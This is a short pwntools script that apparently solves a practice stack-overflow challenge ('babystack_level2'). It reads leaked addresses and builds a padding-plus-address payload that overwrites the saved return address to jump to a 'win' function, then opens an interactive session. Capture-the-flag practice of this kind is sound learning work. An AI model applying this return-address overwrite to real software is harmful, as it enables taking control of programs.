from pwn import *
import chardet

r = process("/challenge/babystack_level2")

r.recvuntil(b'Return Address: ')
ret = int(r.recvline(keepends=False), 16)

r.recvuntil(b'base pointer rbp: ')
bp = int(r.recvline(keepends=False), 16)

r.recvuntil(b'will be stored: ')
buff = int(r.recvline(keepends=False), 16)

win = ret - 823

input = b'a'*(bp - buff + 8)+ p64(win)
detected_encoding = chardet.detect(input)["encoding"]

r.sendline(input)
r.recv()
r.interactive()